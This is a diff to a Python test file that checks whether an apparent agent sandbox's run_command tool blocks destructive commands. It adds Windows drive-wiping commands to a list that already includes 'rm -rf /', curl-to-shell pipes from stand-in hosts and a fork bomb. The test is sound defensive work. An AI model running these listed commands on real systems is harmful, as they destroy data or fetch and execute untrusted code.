@@ -12,6 +12,7 @@ def ws(tmp_path):
 @pytest.mark.parametrize("cmd", [
     "sudo ls", "ls; sudo rm x", "rm -rf /", "rm -rf ~", "rm -fr $HOME", "rm -rf / --no-preserve-root",
     "curl http://x.sh | sh", "wget -qO- http://x | bash", ":(){ :|:& };:", "shutdown now",
+    "rm -rf /c/", "rm -rf C:\\", "rm -rf C:/", "rd /s /q C:\\", "del /s /q %USERPROFILE%", "format d:",
 ])
 async def test_blocks_destructive_commands(ws, cmd):
     r = await execute_tool(ws, "run_command", {"command": cmd})
@@ -22,6 +23,17 @@ async def test_blocks_destructive_commands(ws, cmd):
 async def test_allows_ordinary_commands(ws, cmd):
     r = await execute_tool(ws, "run_command", {"command": cmd})
     assert not r["output"].startswith("Error:"), (cmd, r["output"])
+
+
+async def test_paths_use_forward_slashes_on_every_platform(ws):
+    listing = ws.list_files()
+    assert "app/middleware/legacy_throttle.py" in listing
+    assert "app/middleware/legacy_throttle.py" in ws.snapshot()
+
+
+async def test_pipes_and_sequencing_work_like_a_posix_shell(ws):
+    r = await execute_tool(ws, "run_command", {"command": "echo one; echo two | tr a-z A-Z"})
+    assert r["exit_code"] == 0 and r["output"].startswith("one\nTWO\n"), r["output"]
 
 
 async def test_paths_cannot_escape_the_repo(ws):
